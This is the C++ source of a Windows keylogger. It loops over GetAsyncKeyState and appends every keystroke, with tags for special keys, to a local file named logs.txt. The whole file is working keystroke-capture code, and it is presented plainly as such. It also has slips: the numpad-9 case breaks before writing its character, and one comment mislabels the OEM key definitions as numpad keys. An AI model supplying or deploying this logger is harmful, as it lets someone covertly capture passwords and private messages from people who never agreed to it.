
#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <fstream>



// alpha-numeric keys are the same for all english keyboards. But other keys can differ for different layouts therefore we need to identify which key is being pressed
// For key IDs: http://www.kbdedit.com/manual/low_level_vk_list.html
// 
// 
// VIRTUAL KEY IDS (Numpad)
#ifndef VK_OEM_1
#define VK_OEM_1 0xBA
#endif
#ifndef VK_OEM_2
#define VK_OEM_2 0xBF
#endif
#ifndef VK_OEM_3
#define VK_OEM_3 0xC0
#endif
#ifndef VK_OEM_4
#define VK_OEM_4 0xDB
#endif
#ifndef VK_OEM_5
#define VK_OEM_5 0xDC
#endif
#ifndef VK_OEM_6
#define VK_OEM_6 0xDD
#endif
#ifndef VK_OEM_7
#define VK_OEM_7 0xDE
#endif
#ifndef VK_OEM_8
#define VK_OEM_8 0xDF
#endif
#ifndef VK_OEM_9
#define VK_OEM_9 0xE0
#endif

#define VK_OEM_PLUS       0xBB   // '+' any country
#define VK_OEM_COMMA      0xBC   // ',' any country
#define VK_OEM_MINUS      0xBD   // '-' any country
#define VK_OEM_PERIOD     0xBE   // '.' any country



#define save_path "logs.txt" // absolute path example: C:\\Logs\\logs.txt



using namespace std;
using std::ofstream;
using std::cout;
using std::endl;

int begin_logging(void);


int main(void)
{

    int t = begin_logging();

    return t;

}






int begin_logging(void)

{

    short character;

    while (1)
    {

        Sleep(10);/*to prevent 100% cpu usage*/

        for (character = 8; character <= 222; character++)
        {

            if (GetAsyncKeyState(character) == -32767)
            {
                ofstream logfile;
                logfile.open(save_path, std::ios_base::app);

                if (!logfile.is_open())
                {
                    return 1;
                }
                else
                {

                    if ((character >= 39) && (character <= 64)) //ascii numeric and symbols

                    {
                        logfile << char(character);
                    }

                    else if ((character > 64) && (character < 91)) //ascii alphabets convert UPPER to LOWER
                    {
                        character += 32;
                        logfile << char(character);
                    }

                    else

                    {

                        switch (character)

                        {

                            case VK_SPACE:
                                logfile << ' ';
                                break;
                            case VK_SHIFT:
                                logfile << "[SHIFT]";
                                break;
                            case VK_RETURN:
                                logfile << "[ENTER]\n";
                                break;
                            case VK_BACK:
                                logfile << "[BACK]";
                                break;
                            case VK_TAB:
                                logfile << "[TAB]";
                                break;
                            case VK_CONTROL:
                                logfile << "[CTRL]";
                                break;
                            case VK_DELETE:
                                logfile << "[DEL]";
                                break;
                            case VK_OEM_1:
                                logfile << "[;:]";
                                break;
                            case VK_OEM_2:
                                logfile << "[/?]";
                                break;
                            case VK_OEM_3:
                                logfile << "[`~]";  //US keyboard
                                break;
                            case VK_OEM_4:
                                logfile << "'['";
                                break;
                            case VK_OEM_5:
                                logfile << "[\\|]";
                                break;
                            case VK_OEM_6:
                                logfile << "']'";
                                break;
                            case VK_OEM_7:
                                logfile << "['\"]"; //US keyboard
                                break;
                            case VK_OEM_PLUS:
                                logfile << '+';
                                break;
                            case VK_OEM_COMMA:
                                logfile << ',';
                                break;
                            case VK_OEM_MINUS:
                                logfile << '-';
                                break;
                            case VK_OEM_PERIOD:
                                logfile << '.';
                                break;
                            case VK_NUMPAD0:
                                logfile << '0';
                                break;
                            case VK_NUMPAD1:
                                logfile << '1';
                                break;
                            case VK_NUMPAD2:
                                logfile << '2';
                                break;
                            case VK_NUMPAD3:
                                logfile << '3';
                                break;
                            case VK_NUMPAD4:
                                logfile << '4';
                                break;
                            case VK_NUMPAD5:
                                logfile << '5';
                                break;
                            case VK_NUMPAD6:
                                logfile << '6';
                                break;
                            case VK_NUMPAD7:
                                logfile << '7';
                                break;
                            case VK_NUMPAD8:
                                logfile << '8';
                                break;
                            case VK_NUMPAD9:
                                break;
                                logfile << '9';
                                break;
                            case VK_CAPITAL:
                                logfile << "[CAPSLOCK]";
                                break;
                            default:
                                // unidentified key
                                logfile << '{';
                                logfile << character;
                                logfile << '}';
                        }

                    }

                }
                logfile.close();
                break;

            }

        }

    }

    return EXIT_SUCCESS;

}








